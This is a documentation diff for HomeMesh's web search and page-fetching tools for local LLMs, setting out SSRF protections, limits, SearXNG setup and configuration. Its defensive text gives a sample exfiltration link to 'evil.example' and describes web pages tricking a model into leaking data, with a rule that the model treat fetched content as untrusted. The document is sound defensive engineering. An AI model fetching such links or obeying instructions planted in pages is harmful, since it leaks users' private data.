@@ -16,22 +16,29 @@ online, and only models with tool support (the **tools** capability on the Model
 
 * **Opt-in per computer.** A tool runs only on computers whose `worker.allowed_tools` lists it
   (`homemesh worker allow-tool …` on that computer). The coordinator can't turn it on remotely.
-* **Your own search engine.** `web_search` talks to SearXNG on `127.0.0.1` of that computer. SearXNG
-  asks public search engines (DuckDuckGo, Brave, Wikipedia, …) for you: no account, no API key, and
-  no other computer on your network can use it. Search queries do leave your network; that is the
-  point of a web search.
+* **Your own search engine.** `web_search` talks to the SearXNG you set up; the installer puts it on
+  `127.0.0.1` of that computer, so no other computer on your network can use it. SearXNG asks public
+  search engines (DuckDuckGo, Brave, Wikipedia, …) for you: no account, no API key. Search queries do
+  leave your network; that is the point of a web search. (If you point `web.searxng_url` at another
+  computer or a public instance, every query goes there; `homemesh web set-searxng` and
+  `homemesh doctor` warn about that.)
 * **Never your home network.** `fetch_url` refuses every private, local and special address:
   `127.0.0.0/8`, `10/8`, `172.16/12`, `192.168/16`, link-local (incl. `169.254.169.254`), CGNAT/Tailscale
   `100.64/10`, IPv6 local ranges, multicast and reserved ranges, and IPv4 addresses hidden inside IPv6.
-  It also refuses every address on the computer's own networks, including its *global* IPv6 network
-  (at home, the PC, the router and a NAS usually have public IPv6 addresses too). So a model, or a web
-  page talking to it, can't reach your router, Ollama, another HomeMesh computer or a NAS. One gap
-  remains: if your router answers on its own public IPv4 address from inside, HomeMesh can't know
-  that address without asking an outside service (it doesn't), so it can't block it. Every redirect is checked again; HomeMesh connects to exactly the address it checked (so a
-  DNS answer that changes in between can't sneak through) while still verifying the site's HTTPS
-  certificate against its real name. Only web ports are used (80, 443 and ports from 1024 up), downloads
-  are limited (5 MB, 20 s, 5 redirects by default, also for compressed pages) and proxy settings from
-  the environment are ignored.
+  It also refuses every address on the computer's own networks, and for IPv6 the whole /48 around
+  each of its public addresses (at home, the PC, the router, a NAS and guest or IoT networks usually
+  all have public IPv6 addresses from that prefix). So a model, or a web page talking to it, can't
+  reach your router, Ollama, another HomeMesh computer or a NAS on those addresses. What it can't
+  recognise: services you made reachable from the internet yourself (port forwarding) when they are
+  asked for by your home's public IPv4 address or a dynamic-DNS name, because HomeMesh doesn't ask an
+  outside service what that address is. Every redirect is checked again; HomeMesh connects to exactly
+  the address it checked (so a DNS answer that changes in between can't sneak through) while still
+  verifying the site's HTTPS certificate against its real name (with Mozilla's list of certificate
+  authorities, plus `web.extra_ca_file` if you set one). Only web ports are used (80, 443 and ports
+  from 1024 up), downloads are limited (5 MB and 20 s per page or redirect, 5 redirects, 45 s for the
+  whole download and 60 s per call, also for compressed pages; only the first 2 million characters of a
+  page are read) and proxy settings from the environment are ignored. The model sees about
+  8,000 characters of a result: a page's title and links first, then its text, shortened to fit.
 * **No silent data leaks through links.** A model that was tricked by a web page might try to send
   your data out by fetching `https://evil.example/?data=…`, or by choosing *which* of a page's links
   to fetch. So `fetch_url` runs without asking only for addresses that **you** wrote in this
@@ -48,8 +55,9 @@ online, and only models with tool support (the **tools** capability on the Model
   untrusted data; the model is told never to follow instructions in them and never to put your private
   information into a search or link, and to name the URL when it uses information from the web. Like
   any language model it can still be misled, which is why actions need your approval.
-* **Visible and audited.** Every call, approval and result appears in the chat (expand "arguments and
-  result") and in the audit log. HomeMesh identifies itself to websites with the user agent
+* **Visible.** Every call, approval and result appears in the chat (expand "arguments and result") and
+  in the tool history (`GET /api/v1/tools/executions`); the audit log (Settings → Security) records
+  each run and each approval decision. HomeMesh identifies itself to websites with the user agent
   `HomeMesh/<version>` and sends no telemetry.
 
 Want to approve every search and page too? Settings → Tool permissions → set `web_search` / `fetch_url` to
@@ -101,8 +109,10 @@ homemesh restart
 ```
 
 Optional: `homemesh worker allow-tool fetch_url` on the hub as well, so the assistant can still read
-pages when the Bazzite desktop is off. (Search needs SearXNG, so it only works while the Bazzite desktop
-is on.)
+pages when the Bazzite desktop is off. Note that the hub then becomes the default computer for reading
+pages (the model can still pick another). Antivirus that inspects HTTPS on Windows breaks page reading
+there unless you set `web.extra_ca_file` (see TROUBLESHOOTING.md). (Search needs SearXNG, so it only
+works while the Bazzite desktop is on.)
 
 ### 4. Try it
 
@@ -126,8 +136,9 @@ On the computer that runs the tools (`homemesh config path` shows the file):
 | `safesearch` | `1` | SearXNG safe search: `0` off, `1` moderate, `2` strict. |
 | `search_language` | `auto` | Search language, e.g. `en`, `de`, `all`. |
 | `max_results` | `8` | Results per search (the model may ask for up to 20). |
-| `timeout_s` | `20` | Per request (search, or each page/redirect). |
+| `timeout_s` | `20` | Per search request, and per page or redirect for `fetch_url` (one deadline each, max 30). A whole search stops after 40 s; a `fetch_url` download (redirects included) after 45 s, and the whole call after 60 s. |
 | `max_download_mb` | `5` | Larger pages are cut off (marked `truncated`). |
+| `extra_ca_file` | `""` | An extra CA certificate (PEM) to trust for `fetch_url`, e.g. your antivirus's HTTPS-inspection root. Mozilla's list stays in use; verification is never turned off. |
 | `max_redirects` | `5` | |
 
 The tools themselves are allowed in `[worker] allowed_tools` (`web_search`, `fetch_url`, `open_url`).
@@ -136,9 +147,12 @@ The tools themselves are allowed in `[worker] allowed_tools` (`web_search`, `fet
 
 The Quadlet file pins the image by digest (`deploy/bazzite/homemesh-searxng.container`), so it never
 changes behind your back. HomeMesh updates may move the pin to a newer SearXNG build; to apply it,
-`git pull` and run `bash deploy/bazzite/install-searxng.sh` again (your settings file is kept). To pick
-a newer build yourself, put its digest in the `Image=` line (`podman pull docker.io/searxng/searxng:latest`
-then `podman image inspect --format '{{.Digest}}' docker.io/searxng/searxng:latest`) and re-run the script.
+`git pull` and run `bash deploy/bazzite/install-searxng.sh` again (your settings file and port are
+kept). To pick a newer build yourself, don't edit the file from the repository (that blocks `git pull`);
+find its digest (`podman pull docker.io/searxng/searxng:latest`, then
+`podman image inspect --format '{{.Digest}}' docker.io/searxng/searxng:latest`) and run
+`HOMEMESH_SEARXNG_IMAGE=docker.io/searxng/searxng@sha256:<digest> bash deploy/bazzite/install-searxng.sh`.
+A later run without that variable goes back to the build HomeMesh pins.
 
 Remove: `bash deploy/bazzite/install-searxng.sh --remove` stops it and removes the service; the settings,
 image and cache volume are kept until you delete them (the script prints how). Then
@@ -154,6 +168,7 @@ image and cache volume are kept until you delete them (the script prints how). T
 * `open_url` opens a page; it cannot click, type or read what the browser shows afterwards.
 * On Linux, `open_url` needs a graphical desktop session for that user (it uses `xdg-open`; when HomeMesh
   was started by systemd before the desktop, it goes through the user manager with `systemd-run --user`).
+  This path has only been tested with stand-in programs, not yet on a real KDE or GNOME desktop.
 
 ## What has been tested
 
